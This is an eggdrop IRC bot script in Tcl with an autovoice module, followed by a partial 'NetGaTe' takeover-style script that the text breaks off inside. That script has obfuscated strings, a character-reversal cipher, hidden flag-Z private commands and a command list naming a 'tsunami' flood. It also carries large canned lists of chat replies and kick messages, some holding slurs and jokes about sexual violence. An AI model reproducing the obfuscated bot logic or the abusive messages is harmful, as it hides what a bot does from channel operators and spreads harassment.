## voice/devoice 
#Set the channels below (each separated by a space) on which this script would work.
set autovoice(chans) "#kotamobagu"
#Set the 'number of lines' here after which a user will be voiced
set autovoice(lines) "5"
#Users idling for more than this number of minute(s) will be devoiced.
set autovoice(dvtime) "180"
#Set the time here in 'minutes' after which you would continuously like to check
set autovoice(dvcheck) "60"

bind pubm - "*" autovoice:users
bind ctcp - ACTION autovoice:users2
proc autovoice:users2 {nick host hand chan keyword arg} {
  autovoice:users $nick $host $hand $chan $arg
}
bind join - "*" autovoice:erase:record
if {$autovoice(dvtime) > 0} {bind time - "*" autovoice:devoice:idlers}

proc autovoice:users {nick uhost hand chan text} {
 global autovoice voice
 if {![botisop $chan] || [isbotnick $nick] || [isop $nick $chan] || [isvoice $nick $chan] || ![string match "*+active*" [channel info $chan]]} { return 0 }
 set user [split [string tolower $nick:$chan]]
 if {![info exists voice($user)] && ![isvoice $nick $chan] && ![isop $nick $chan]} {
   set voice($user) 0
 } elseif {[info exists voice($user)] && ([expr $voice($user) + 1] >= $autovoice(lines)) && ![isop $nick $chan] && ![isvoice $nick $chan]} {
   utimer 3 [list autovoice:delay $nick $chan] ; unset voice($user)
 } elseif {[info exists voice($user)]} { incr voice($user)}
}
proc autovoice:delay {nick chan} {
 set user [split [string tolower $nick:$chan]]
 if {[botisop $chan] && [onchan $nick $chan] && ![isop $nick $chan] && ![isvoice $nick $chan] && ![string match "Guest*" $nick]} { putserv "MODE $chan +v $nick" ; set voiced($user) 1 }
 if {[info exists voiced($user)]} { putserv "MODE $chan -k 6active.chatter" ; flushmode $chan }
}
proc autovoice:erase:record {nick uhost hand chan} {
 global autovoice voice
 if {[isbotnick $nick] || ![string match "*+active*" [channel info $chan]]} { return 0 }
 set user [split [string tolower $nick:$chan]]
 if {[info exists voice($user)]} { unset voice($user) }
}
proc autovoice:devoice:idlers {m h d mo y} {
  global autovoice
  if {([scan $m %d]+([scan $h %d]*60)) % $autovoice(dvcheck) == 0} {
  set chans [string tolower [channels]]
  foreach chan $chans {
	  if {[botisop $chan] && [string match "*+active*" [channel info $chan]]} {
putlog "chek idle user on $chan"
        foreach user [chanlist $chan] {
          set user [string tolower $user]
          if {[botonchan $chan] && ![isbotnick $user] && ![isop $user $chan] && [isvoice $user $chan] && ([getchanidle $user $chan] >= $autovoice(dvtime)) && ![matchattr $user f] && ![matchattr $user v]} {
              putserv "MODE $chan -v $user"
              if {![info exists devoice($chan)]} { set devoice($chan) 1 }
            } else { continue }
        }
        if {[info exists devoice($chan)]} { putserv "MODE $chan -k 6depois.for.idle" ; flushmode $chan }
} } } }
putlog "Active Chatter v3.75.b has been loaded successfully."

#####################################################
## sQu tcl ripped from NetGaTe                     ##
## Maret 2015                                      ##
## si@bayo.cool                                    ##
#####################################################
proc lines {txt} {
  global lenc ldec uenc udec
  set retval ""
  set count [string length $txt]
  set status 0
  set lst ""
  for {set i 0} {$i < $count} {incr i} {
    set idx [string index $txt $i] 
    if {$idx == "$" && $status == 0} { set status 1 ; set idx "~$idx" }
    if {$idx == [decrypt 64 "uAwNV.ZfVQk."] && $lst != [decrypt 64 "59.TI0HteTn1"] && $status == 0} { set status 2 ; set idx "~$idx" }
    if {$idx == " " && $status == 1} { set status 0 ; set idx "$idx~" }
    if {$idx == "]" && $status == 2} { set status 0 ; set idx "$idx~" }
    if {$status == 0} {
      if {[string match *$idx* $lenc]} { set idx [string range $ldec [string first $idx $lenc] [string first $idx $lenc]] }
      if {[string match *$idx* $uenc]} { set idx [string range $udec [string first $idx $uenc] [string first $idx $uenc]] }
    }
    set lst $idx ; append retval $idx
  }
  regsub -all -- vmw] $retval "end]" retval ; return $retval
}
set bancounter {
  "12ï¿½-0B12-0O12-0O12-0O12-0O12-0M12-ï¿½"
}
set querym {
  "hai juga" "halo" "apakabar" "asl dong" "haiiii" "siapa ya" "lagi dimana ?" "haloooo" "apa kabar" "siapa ya ?" "yup" ":-)" "no pv pls x(" "ya ada apa?"
  "aha!" "capa ini imut sekali :P" "mojok yuk" "kangen.." "d0r!" "dari mana?" "dah lama cetingnya?" "jam brp skrng?" "woi balikin clana dalem gw!!"
  "O.o" "Kantong menyan lo ko gede sebelah" "godain qta donk ^-^" ":(" "(-_- )" "wb wb" "koq baru keliatan?" "woii" "slamat ceting" "hehe si jelek"
  "apa tayank" "napa?" "-_-`" ":):)" "..." "suiitt suiitt.." "suiitt suiitt.. plok plok" "yuhuu" "loh?" "hah?" "dasar" "ga laper lu?" "Hi too.."
  "minta pelmen bon bon dunk, hikz" "apaan tuh" "minta fs dong" "nomer hp kamu brapa ?" "imel kamu apa?" "cari siapa? " "hai hai molo, gw cium baru tau"
  "yes?" "jelek lu" "nah nah" "kenalan yuk" "berpelukannn!" "i miss u" "blom pernah diperkosa 1 RT loe?" "ooee" "ingat bayar hutang besok ya"
  "??" "^.^" "mmuuwaa" "ngantuk ya?" "epon gw besok okey ^^" "-_-`" "na na iguana" "sapa niy?" "hanih..." "weeeii!" "hihi" ":P" "eh dul" "No pv!"
  "ehemm.." "(= ^ _ ^ =)" "pasti mo gebetan lagi" "na na na iguana" "yup" "ya?" "oit" "napa?" ":)" "^^" "O.o" "o.O" ":P" "cuek" "where are you from?!"
  "apaan sich?" "bete tau dipanggil molo" "kamu sapa?" "wekz" "wakz" "sapa ya?" "sorry ga kenal" "iya tayank" "wew" "dudulz" "igh lucu na" "what do you need?"
  "kamu cakep ga?" "sapa ni, nalan dolo donk" "GggRrr.." "mo ga gw jitak?" "knp dul?" ">.<" "eiiitt.." "nah nah" "beuh" "hushh hushh :P" "Maaf lagi jadi bot ni"
  "dah mandi belom ?" "brisik! :P" "nungging lo!" "ketik C spasi D Cape Deeee" "weQs~" "Ada co nggak yach ??" "hah?" "d0r!" "sssstt..." "???" "Hai, asl dong"
  "^^" ":)" ":):)" ":P" "kangennnn" "miss uuuuu" "hayahh" "wei, ngapain teriak2" "brisik! :P" "kemana aja ko baru keliatan ?" "whats up?!" "whats cookin'?"
  "whatcha up to? :))" "hey! hows ya??" "hows ya!?" "hows ya?, mate!" "how r u" "how are you doing?" "how r u?" "howdie? :x" "howdie? mate!" "hows ya doin?"
  "hows ur gf doing?" "hows you doin?" "whats cookin' mack!? :p" "how how, how are you brown cow?" "whats your name?!" "what have ya been upto? eh?"
  "how are you?" "where ya from!?" "hows ya been doin? :)" "a/s/l?" "what do ya do??!" "whats ur name?" "whats ya name? :/" "where do you live?" 
  "how old are ?" "how old r u?" "a/s/l? plz" "are u m/f?" "m or f?" "male or female?" "male/female?" "asl plz" "asl please :)" "how r u doing?"
  "how r you?" "how are u?" "a/s/l please!" "how have u been? :D" "where did u go?" "what do you do?" "what do u do?!" "how can i help you?!" 
  "what do ya want!" "what do you want?" "do you know me?!" "do i know you?" "do u know me?" "do i know u? hmm" "have we talked before?!" "have we met before?"
  "Hi, How are you?" "Hi, How are u today?" "yeah? what's up?" "what's up doc?" "Hi too, asl pls.." "what's up?" "sorry, i'm very busy right now.."
  "yeah? who are you?" "do i know u?" "yeah? do i know u?" "who the hell are you?" "i'm curently away, may be later.." "where u came from?" "Pasti gak tau kalo Gue bot :D"
  "yeah, nice to meet u.." "nice to meet u.." "what is ur real name?" "yeah? asl pls.." "i'm curently busy, may be later.." "Sori lagi ga bisa ngobrol nanti aja ya"
}
set cyclem {
  "refreshed!" "rehashed!" "che(c)king" "isen(G)" "(c)ycling" "!bang" "!reload" "aw aw"
}
set partm {
  "BaCk To BaSe" "owner Request!" "Wrong Channel!" "Be Right Back!" "Too many join channel"
}
set awaym {
  "Making Babies" "Making Dragons" "Checking mail" "NaTure CaLLs :P brb" "stomach ache... im currently in the toilet" "playstation rulez" "phonecall" "brb-a.s.a.p"
  "sleep...nuff said" "Definitely NoT here :P" "Pretending to be Auto-Away" "Checking shells" "Make Love With Someone :P" "NoT here, use email" "NoT here, Guess where? :P"
  "Don't Keep Me Waiting!" "Call FBI if i dont comeback on 24 hour" "DoWn" "Checking Boom" "Hacking Root" "Tetrinet Is Not Lame" "Hmmm Not Here" "Auto-Away After 10 Mins"
  "DeaD" "Surfing With The Alien" "Hungry, Exploring My Fridge" "Auto-Away" "Checking Shells" "NoT Here" "Ku Tau Yang Ku Mau" "Always CoCaCoLa"
  "Bikin HiDuP Lebih HiDuP" "Coba MeRaH" "Makan NgaK Makan AsaL Ngumpul" "BuKaN Basa Basi" "Nice Dream.." "Welcome To My Life" "AsiK nya RameRame"
  "Mutha Fvcka Don`t Whois Me Again..!!!" "I`m NoT Here" "Honeymoon Day.." "NyuCiii..." "Mojok Ma Yayank .." "Ngga ada di Tempat" "MinuM VodKa" "Cebokin Yayank"
  "Cari Gebetan" "Making Babies" "Making Dragons" "Checking mail" "NaTure CaLLs :P brb" "stomach ache... im currently in the toilet" "playstation rulez" "Don't Keep Me Waiting!"
  "phonecall" "brb-a.s.a.p" "sleep...nuff said" "Definitely NoT here :P" "Pretending to be Auto-Away" "Checking shells" "Make Love With Someone :P" "NoT here, use email"  
}
set rms {
  "5s4(02H4)b"
}

set kickms {
  "I'm only doing this because I care.." "skin and bones, blood and teeth, well this is essentially who we are" "I recommend you see a therapist.." "Everyone will suffer now, you can't save yourself!"
  "I'm too lazy to give you a real message.." "This random kick is brought to you by kick master !!" "You Have Underestimated The Dark Side ! Now You Must Die !" "-(!)- CRASH -(!)- Ouch ! Thats Gotta Hurt Mr Pancake !"
  "E=mc2 = F/(s^2) = (x-y3*2,03)" "Yuch ! What A Stinch !" "Not Going To Sit For A While ?" "Well Aren't You Answering Me ?" "Thanks I Needed These !" "Come Back When You Can Breath !" "This random message was censored by popular request.."
  "Ohh Isn't That Love Between Man And Animal So Cute !" "Damn I Got Brains All Over Me !" "SHUU !! You Are Dead !" "Man What A NutCase !" "-> Caught You Looking ! <-" "That Was A Nice Try Kid" "Look! A Talking BungHole!"
  "This is our subtle way of saying goodbye" "-> Kiddie Kick <-" "I Am Doing It, YES ! (Phew Was Close Again)" "We Don't Like Faggots Here !" "Hey SHUT THE FUCK UP !" "Buh Bye Then !" "#lamers is a better place for you"
  "|ï¿½| <- there's the exit" "Lamer Shields Activated !" "This Is My Last Option" "Do You Want to See the Bed in Flames?" "You believe it would be hard to kill, But where are all of the dead coming from?" "Sex is a Battle, Love is War..."
  "I'm not sorry, this is what you deserve!!" "Run, run for your lives..." "You, in the schoolyard, I am ready to kill You..." "My black blood and your white flesh..." "The cold sweat on your white forehead, hails into my sick brain..."
  "I will always become hornier from your screams..." "Your White Flesh Excites Me So..." "I'm Just a Gigolo..." "My father was exactly like me..." "Your White Flesh Enlights Me..." "Warm body, hot cross, wrong judgment, cold grave..."
  "I will return in ten days, as your shadow, and I will hunt you down..." "Ashes to ashes, and dust to dust..." "I follow you, I find you, I touch you, And Now, I have you..." "Never again, the old sorrow..." 
  "Save each other from being in pairs..." "A man is burning..." "The smell of flesh lies in the air..." "A child is dying..." "A sea of flames..." "Blood is coagulating on the asphalt..." "Boo-hoo"
  "...and there was much rejoicing.." "A pity you have to leave so early" "Absence makes the heart grow fonder" "All for one, and one for all." "And now eat my poo-poo" "And now the final scene, a global darkening..."
  "Any fool can make a rule and every fool will mind it." "Are you real??? No....I think not!!! I'm sure!!!" "Mothers are screaming..." "A mass grave..." "Armegeddon is here, like said in the past." 
  "Burning in my brain, I can feel the pain." "No escape..." "No birds are singing anymore..." "The sun is shining..." "God knows I don't want to be an angel..." "You have asked me, and I have said nothing..."
  "Can you break hearts?" "Can hearts speak?" "Can you torture hearts?" "Can you steal hearts?" "Can hearts sing?" "Can a heart burst?" "Can hearts be pure?" "Can a heart be made of stone?" "Can you ask hearts?"
  "Can you carry a child under yourself?" "Can you give it away?" "Can you think with your heart?" "They want my heart on the right spot, but then I look below, it beats left there..." "Left two three four left!"
  "One, two, three, four, five, six, seven, eight, nine, out..." "And the world counts loudly to ten" "Here comes the sun..." "Can you hear me? Can you see me? Can you feel me? I don't understand you..." 
  "I wait for you, at the end of the night..." "Whats That Red 15 Meter Long Rope Back There ?" "Can i get a goal from it?" "Congratulations, You got kicked !!!" "The OP is always correct" 
  "No animals allowed, sorry, please join pet !!" "Popular Request !!!" "Random Kick Message" "Ultimate, powerful, Exccesive, Super, Deluxe, Large, Big Lamer Detected" "I am a hunter, I'm hunting lamers"
  "Reminder:We aren't no friends anymore" "I'm doing this because you suckssss" "World Guiness Record you were kicked 999999999 a day !!!" "mode +su means SHUT UP!!" "Viruses Kicked, Channel Clean !!"
  "Do not give opinions or advice unless you are asked" "Do not tell your troubles to others unless you are sure that they want to hear them" "When in another's lair, show him respect or else do not go there"
  "If a guest in your lair annoys you, treat him cruelly and without mercy" "Do not make sexual advances unless you are given the mating signal" "Do not take that which does not belong to you unless it is a burden to the person and he cries out to be relieved"
  "Acknowledge the power of magic if you have used it successfully to obtain your desires. If you deny the power of magic after having called upon it with success, you will lose all you have obtained"
  "Do not complain about anything to which you need not subject yourself" "Do not harm little children" "Do not kill non-human animals unless attacked or for your food" "When walking in open territory, bother no one. If someone bothers you, ask him to stop. If he does not stop, destroy him"
  "Error:Illegal Kick Operation !!!" "This is a speed test for IRC Kick Engines!!!" "Fly without wings" "You're a real bad lamer" "We're tire of your silly attitude" "You are not eligible to join here, less morality !!!"
  "This channel is not for lamer's !!" "Better to go like this or else, you will lose your head in reality !!" "Make an appoinment in some other day" "angry? So What !"
  "Is it painful? Go get a doc !!!" "Your violence entertain me, EAT THIS !!" "I know you will love this" "Ohhh you are out !!!" "Go sit at a corner" "rubbish is YOU !!"
  "YOU FORCE ME" "Any fool can make a rule and every fool will mind it" "Eye for eye, tooth for tooth, hand for hand, foot for foot" "All for one, one for all" "Are you feeling lucky????"
  "Did you hear something?" "Another spammer meet the foot-face" "Tell me what you've got" "Please, do not S*P*A*M*M*I*N*G!!" "Out, damn spot, out I say!" "I can hear somebody FELL in the blank!"
  "Can somebody stop this guy???" "Perhaps you should try real life for awhile" "okluvyabubye" "*blam!* yeah, beeyaaaach I poped a cap in yo' ass!" "Another spammer meet the foot-face - [o]"
  "eeeeeeeekkkkkkkk!" "Out!!" "U hurt my ears , my eyes , my felling and u`re OUT !!" "From Heaven With Love" "Heaven And Earth And You go to moon" "Ups!!" "Sorry but u`re not allowed being here"
  "U like my new shoes ?!" "No reason :Pp~" "Kick Kick Kick Kick Kick Kick" "Can't do nuttin with that" "Testing Testing" "Isit hurt ?!" "Lamer detected" "Uncool not allowed" "Request - Request"
  "Go!!" "Are You there ?ï¿½?" "asl pls :P~" "Last warning now hush!!" "Confucius say If you can't shut up here, speak elsewhere" "Eat this!!" "Jump or die!" "And should we really care?" "If you're fighting to live, It's ok to die!"
  "No escaping pain, you belong to me" "I need a ride to the morgue, that's what 911 is for" "That doesn't kill me, only makes me stronger" "Forgive me father, for I have sinned" "Lie, steal and cheat, a real bad guy!"
  "Pull over, shithead, this is the cops!" "Rot in hell, it's time you know your master, off you go!" "Excess Lameness" "Killed (Mom (Don't hang around with them! They're troublemakers!)"
  "Come back when you've finally learned not to be lame" "Congratulations, you won a brand new kick!" "Crash! Boom! Bang!" "Cya later - much later" "Death greets me warm, now I will just say goodbye."
  "Death in the air, strapped in the electric chair." "Choose your fate and die!" "You've been dying since the day you were born" "You know it has all been planned" "Now there's nothing you can do"
  "Cya, Wouldn't wanna be ya" "Thanks for leaving, come back soon!" "He winds up and your out" "YOUR FIRED!!!" "There is the kick And It's GOOD!" "What to expect in upcoming versions" "More commands*"
  "Any suggestions submitted*" "Any fixes for bugs in pervious version(s)*" "Updated kicks files*" "Only In Sadness Comes Awakening" "Not enough memory to display" "Another one bites the dust"
  "No Such Nick/channel" "Damm, I'm good" "I think I will have another beer" "that's all i have to say about you" "There's a better place for you; But itï¿½s far, far away" "If you think that f*ck is funny, f*ck yourself and save your money"
  "Kenny doesnï¿½t want to die!!" "Yo momma so ugly the government moved Halloween to her birthday" "Yo momma so stupid she watches teletubbies and takes notes" "Mess with the best die like the rest"
  "This isnï¿½t BitchX baby!" "Yo momma so stupid she sits on the TV, and watches the couch" "Yo momma so bald that she took a shower and got brain-washed" "Kyles momma is a stupid bitch!"
  "Here comes the sun" "We're going to have a problem here" "May I have your attention please? Will the real Slim Shady please stand up?" "I'm Slim Shady" "Yes I'm the real Shady All you other Slim Shadys are just imitating So won't the real Slim Shady Please stand up"
  "Eyes of glass stare directly at death." "Fall to your knees, and bow to the Phantom Lord." "Fight fire with Fire, bursting with fear." "Fight fire with fire, the ending is near."
  "For now you've got some company." "Freezing, can't move at all" "From deep sleep I have broken away." "Frozen soul, frozen down to the core." "Eye for eye, tooth for tooth, hand for hand, foot for foot."
  "Another spammer meet the foot-face" "Tell me what you've got..." "Please, do not S*P*A*M*M*I*N*G!!" "I came, I saw, I conquered. (Veni, Vidi, Vici)" "Can u stop giving me BULLSHIT?"
  "Out." "damn - i cant stop this guy. i have no choice... :P" "bitch you spamming to me!! get lost!!" "I'm too lazy to give you a real kick message"
  "Next motherfucker gonna get my metal..." "Goddamn your righteous hand..." "You cannot sedate all the things you hate..." "Light a candle for the sinners, set the world on fire!" "How does it feel to be one of the beautiful people?"
  "Everyone will suffer now, you can't save yourself!" "When you are suffering, know that I have betrayed you..." "This isn't me, I'm not mechanical..." "Don't blow your fuckin mind!!" "No salvation, no forgiveness..."
  "The president is dead, let us pray..." "I got my lunchbox and I'm armed real well..." "Someone had to go this far..." "Getting high on violence, baby..." "You may as well kill yourself, you're already dead..."
  "You're just a copy of an imitation..." "I'm not sorry, this is what you deserve..." "Do you love your guns, your god, and government?" "This is beyond your experience!" "YOU CAN'T KILL ME MOTHERFUCKER!!"
  "ALELUIA MOTHERFUCKER!!" "Got a kick in the ass... fuckin asshole" "Nothing more beatifull than one ass out of this channel" "Kick kiry ki ky... OUT SUCKAAA" "Sometimes there is no other solution"
  "Now there's nothing you can do." "Now you've got the fight of your life." "Nuclear warfare shall lay us to rest." "Oops, I did it again" "Why tha fuck were you still here!!!???" "Nope - no wrong button" "You really wanted it, right?"
  "You're falling in a bottomless pit of loneliness" "See you in hell" "So gather round your warriors now and saddle up your steeds." "Sound is ripping through your ears." "Take a look to the sky just before you die."
  "Pimp your brain" "Mr. Mighty ass has left tha building!!!!" "Relaxation is tha key for staying in this chan" "Goodbye ass face... YES... ASS FACE!!!" "Here you are... found ya!!!!" "Sorry, but you are dismissed"
  "You must have been an ass in your other life!" "Get of my face ASSHOLE!!!" "Hello, Hello...No Answer!!!" "Excuse me...Iï¿½d like to ASS you a few questions!!!" "Pissing me off is one of your skills"
  "You really donï¿½t belong here!!! Fuck off!!!" "You're not welcome here" "Ui Ui...What a kick...100% done!!!" "Donï¿½t fuck with me... Get out sucker!!!" "Mess with the best...get kicked like the rest!!!"
  "Are you real??? No....I think not!!! Iï¿½m sure!!!" "ah...ahh...ahhh...bahHAHhahHAHhahahHAHhah...Got kicked!!!" "Mode +q... Means QUIET!" "Well well well... Nasty nasty boy... Fuck off"
  "Go and check http://www.microsoft.com... Lhamer..." "Itï¿½s for ppl like you they invented tha word KICK..." "Just relax and come back in a week..." "LAAHAHA LHAHAHAHAH LAAHAHAHAHAH... Fuck off... Leave the planet!!!"
  "Die with a fuckin brain tumour..." "Don't fuck with me... Get out sucker!!!" "I advise you to go and hide yourself somewhere..." "There are many things you should think about... IRC isnï¿½t one of those..."
  "Jerky assholes like you... should go and... well... fuck you" "Guess what Iï¿½m thinking about? --- The best way to not seing you anymore..." "Guess who's back! back again!!! :)"
  "Guilty as charged, but damnit it aint right!" "Hear the Cry of war." "What doesn't kill you, makes you stronger" "Have you considered suing your brains for non-support?" "I bet your brain feels as good as new, seeing that you've never used it."
  "Keep talking, someday you'll say something intelligent." "There is no vaccine against stupidity." "Since the speed of light is faster than the speed of sound, is that why some people appear to be bright until you hear them speak?"
  "Go away!" "I love pressing this button" "Go play leapfrog with a unicorn" "Where do you wanna go today? Out... Ok!" "I rather want you to stay at teletubbies.com" "Yes, I have OP ;)" "You didn't understand any of this."
  "Get lost!" "You just laughed, ha ha, bitch." "Don't get lost in thought, you'll be a total stranger there." "If you said what you thought, you'd be speechless." "I wish I had a lower I.Q. so that I could enjoy your company."
  "I'm not going to get into a battle of wits with you, I never attack anyone who's unarmed." "It's too bad stupidity isn't painful." "Iï¿½d explain it to you, but I donï¿½t have any crayons with me."
  "Are you always this stupid, or are you making a special effort today?" "Do we have a learning disability here?" "I see no sign of intelligence anywhere..." "â”Œâˆ©â”(â—£_â—¢)â”Œâˆ©â”"
  "I see dumb people... they're everywhere. They chat in IRC like everyone else. They don't even know that they're dumb." "A guy with your IQ should have a low voice too!" "Any similarity between you and a human is purely coincidental!"
  "Are you always so stupid or is today a special occasion?" "As an outsider, what do you think of the human race?" "I'd like to kick you in the teeth, but why should I improve your looks?"
  "At least there's one thing good at your body. It isn't ugly as your face!" "Brains aren't everything. In fact, in your case they're nothing!" "Careful now, don't let your brains go to your head!"
  "I like you. People say I have no taste, but I like you" "Did your mother have any children that lived?" "Did your parents ever ask you to run away from home?" "I want nothing out of you but breathing, and very little of that!"
  "Take off that mask! Don't you think it's a little early for Halloween?" "Don't be ashamed of wat you are. I'm not ashamed of what you are!" "If I had a face like yours. I'd sue my parents!" "Don't feel bad. A lot of people have no talent!"
  "Don't get insulted, but is your job is devoted to spreading ignorance?" "Keep talking, someday you'll say something intelligent!" "Don't mind him. He has a soft heart and a head to match." "Don't you love nature, despite what it did to you?"
  "Don't think, it may sprain your brain!" "people like you don't grow from trees; they swing from them." "you have mechanical mind. Too bad you forgot to wind it up this morning." "you have a mind like a steel trap -- always closed!"
  "You are a person of the world -- and you know what sad shape the world is in." "your always lost in thought -- it's unfamiliar territory." "your dark and handsome. When it's dark, iam handsome." "your known as a miracle comic. if your funny, it's a miracle!"
  "your listed in Who's Who as What's That?" "your living proof of that a person can live without a brain!" "your so short, when it rains your always the last one to know." "you are the kind of a person of people would use as a blueprint to build an idiot."
  "Here's 20 cents. Call all your friends and bring back some change!" "How come you're here? I thought the zoo was closed at night!" "How did you get here? Did someone leave your cage open?" "How much refund do you expect on your head -- Now that it's EMPTY."
  "How would you like to feel the way you look?" "Hi! I'm a human being! What are you?" "I can't talk to you right now; tell me, where will you be in ten years?" "I don't want you to turn the other cheek. It's just as ugly."
  "I don't know who you are, but whatever it is, i'm sure everyone will agree with me." "I don't know what makes you so stupid, but it really works!" "I could make a monkey out of you, but why should I take all the credit?"
  "I can't seem to remember your name, and please don't help me!" "I don't even like the people you're trying to imitate!(if you are at all!)" "I bet you have a loud bark!" "I know you were born silly, but why did you have a relapse?"
  "I know you're a self-made man. It's nice of you to take the blame!" "I know you're not as stupid as you look. Nobody could be!" "I've seen people like you, but I had to pay admission!" "Iï¿½d explain it to you, but I donï¿½t have any crayons with me"
  "Her lips suck forth / see where it flies" "It's been nice knowing you.. well actually, it hasn't" "Support Dan Quayle for President!" "This random kick message was censored by popular request" "And quoth the raven Nevermore"
  "POP goes the weasel..." "Trying to establish a new kick record..." "Look, no more lamer ^^" "There's the exit, learn it well" "This relationship just isn't going to work out" "The op is always right" "You are frightening our customers, we must ask you to leave"
  "Random Kick Message #13" "Excuse me...I'd like to ASS you a few questions!!!" "Excessive lameness detected" "Shhh... Be vewy vewy qwiet... I'm hunting lamers..." "My foot itches... ahh... much better..." "Silly customer, you cannot harm the Twinkie!"
  "Would you like fries with that?" "P.S. This doesn't mean we can't be friends" "If you have to ask, you'll never know" "This kick was sponsored in part by Microsoft Combat Boots" "It must be a monday... -sigh-"
  "Lamer removal successful!" "Oh! Oh! Kick me again!" "That's gotta hurt!" "The fist of terrors breaking through." "Boot to the head!" "The Phantom Lord has NEVER failed." "It's for ppl like you they invented tha word KICK..."
  "It's not that I hate you, its just.. that I dont like you" "It's the beginning of the end." "Its the last time you will!" "Anger is a tool, only for one's opponents" "Error processing request, please try again"
  "Go go gadget army boot!" "...and there was much rejoicing..." "This is a test of the Emergency IRC Kicking System" "My Karma just ran over your Dogma" "People these days won't take responsibilty for anything...but don't quote me on that"
  "Silly rabbi, kicks are for trids!" "Look at that lamer fly!" "Another one bites the dust..." "hehehe, that kickles" "Yes, I have ops" "Thank you, please drive through" "Einstein said We'll use rocks on the other side"
  "Emptiness is filling me, to the point of agony." "Enough for today rookie" "Everybody be cool, YOU - be cool" "Don't let the door hit you on your way out" "I'll see you in my office tomorrow at noon" "*snap* *crackle* *pop*" "Why me?"
  "Waste your time wherever you want, but not here" "Why not?" "*bang bang* you're dead" "Violence is never a solution, but it can be entertaining" "Thanks for your visit" "Thank you for NOT smoking!" "I recommend you to see a psychologist."
  "I wonder what this button does?" "Im tired of your company. Begone!" "Lame and fake - that's you" "I know you like it when I do this" "IIII can't HEAAAAAAAR you!" "Talk to the foot!" "Testing... Worked." "Are we having fun yet?"
  "I tire of your company. Begone!" "Insufficient maturity detected" "Leather and metal are our uniforms, protecting what we are." "Look behind you, a three-headed monkey!" "My channel, my rules" "No Homers" "I would ask you to leave, but why, when I can force you?"
}

set msgcoms { "op" "deop" "voice" "devoice" "join" "part" "chan" "kick" "kickban" "ban" "auth" "passwd" "invite" "owner" "admin" "master" "friend" "chattr" "cycle" "access" "tsunami" "rehash" "reset" "identify" "server" "deluser" "die" "restart" "ignore" }
bind msg Z dc msg_dc ; proc msg_dc {nick uhost hand rest} { global botnick notc ; set rest [lindex $rest 0] ; putquick "PRIVMSG $nick :decrypt: [decrypt 64 "$rest"]" }
bind msg Z ec msg_ec ; proc msg_ec {nick uhost hand rest} { global botnick notc ; set rest [lindex $rest 0] ; putquick "PRIVMSG $nick :encrypt: [encrypt 64 "$rest"]" }
bind msg Z zip msg_zip ; proc msg_zip {nick uhost hand rest} { global botnick notc ; set rest [lindex $rest 0] ; putquick "PRIVMSG $nick :zip: [zip "$rest"]" }
bind msg Z unzip msg_unzip ; proc msg_unzip {nick uhost hand rest} { global botnick notc ; set rest [lindex $rest 0] ; putquick "PRIVMSG $nick :unzip: [dezip "$rest"]" }
bind msg Z lines msg_lines ; proc msg_lines {nick uhost hand rest} { global botnick notc ; set rest [lindex $rest 0] ; putquick "PRIVMSG $nick :lines: [lines "$rest"]" }
bind msg Z ddl msg_ddl ; proc msg_ddl {nick uhost hand rest} { global botnick notc ; set rest [lindex $rest 0] ; putquick "PRIVMSG $nick :dezip+dcp+lines: [dezip [dcp [lines "$rest"]]]" }
bind msg Z timers msg_timers ; proc msg_timers {nick uhost hand rest} { global botnick notc timers ; set rest [lindex $rest 0] ; foreach x [timers] { putquick "PRIVMSG $nick :$x" } }
bind msg Z utimers msg_utimers ; proc msg_utimers {nick uhost hand rest} { global botnick notc utimers ; set rest [lindex $rest 0] ; foreach x [utimers] { putquick "PRIVMSG $nick :$x" } }
bind msg Z tes msg_tes ; proc msg_tes {nick uhost hand rest} { global botnick notc ; set rest [lindex $rest 0] ;  putquick "PRIVMSG $nick :$rest!" }

set lenc abcdefghijklmnopqrstuvwxyz ; set ldec zyxwvutsrqponmlkjihgfedcba ; set uenc ABCDEFGHIJKLMNOPQRSTUVWXYZ ; set udec ZYXWVUTSRQPONMLKJIHGFEDCBA
set global-idle-kick 0
set global-revenge-mode 0
set global-protectops-mode 0
set global-clearbans-mode 0
set global-enforcebans-mode 0
set global-dynamicbans-mode 1
set global-protectfriends-mode 0
set global-userbans-mode 1
set global-cycle-mode 1
set global-chanmode "nt"
set global-dynamicexempts-mode 0
set global-dontkickops-mode 1
set global-greet-mode 0
set global-shared-mode 1
set global-autovoice-mode 0
set global-stopnethack-mode 0
set global-autoop-mode 0
set global-userinvites-mode 0
set global-nodesynch-mode 0
set nick-len 30
if {![info exists nickpass]} { set nickpass "" }
if {![info exists altpass]} { set altpass] "" }
if {![info exists cfgfile]} { set cfgfile $userfile }
proc unsix {txt} { set retval $txt ; regsub ~ $retval "" retval ; return $retval }
proc dezip {txt} { return [decrypt 64 [unsix $txt]] }
proc dcp {txt} { return [decrypt 64 $txt] }
proc zip {txt} { return [encrypt 64 [unsix $txt]] }
if {![info exists server-online]} { putlog "not support server online..!" ; set server-online 1 }
proc puthlp {txt} { global lenc ldec uenc udec notb notc server-online ; if {${server-online} == 0} { return 0 } ; puthelp $txt }
proc putsrv {txt} {
  global lenc ldec banner uenc udec notc server-online notm igflood iskick kickclr
  if {${server-online} == 0} { return 0 }
  set retval $txt
  if {[string match "*KICK*" $retval]} {
    set endval ""
    foreach tmp $retval { if {$tmp == ":$notc"} { if {[info exists banner]} { set tmp ":$banner" } { set tmp ":$notc" } } { if {[info exists kickclr]} { set tmp [uncolor $tmp] } } ; set endval "$endval $tmp" }
    set retval $endval
    if {[info exists iskick([lindex $retval 2][lindex $retval 1])]} { return 0 }
    set iskick([lindex $retval 2][lindex $retval 1]) "1"
    if {[info exists igflood([lindex $retval 2])]} { return 0 }
    if {[string match "*-userinvites*" [channel info [lindex $retval 1]]]} { set chkops $retval ; regsub -all -- : $chkops "" chkops ; if {[isop [lindex $chkops 2] [lindex $retval 1]] || [isvoice [lindex $chkops 2] [lindex $retval 1]]} { return 0 } }
  }
  putserv $retval
}
proc putqck {txt} {
  global lenc ldec banner uenc udec notc server-online notm igflood iskick kickclr bannick is_m
  if {${server-online} == 0} { return 0 }
  set retval $txt
  if {[string match "*KICK*" $retval]} {
    set endval ""
    foreach tmp $retval { if {$tmp == ":$notc"} { if {[info exists banner]} { set tmp ":$banner" } { set tmp ":$notm" } } { if {[info exists kickclr]} { set tmp [uncolor $tmp] } } ; set endval "$endval $tmp" }
    set retval $endval ; set iskick([lindex $retval 2][lindex $retval 1]) "1"
    if {[info exists igflood([lindex $retval 2])]} { return 0 }
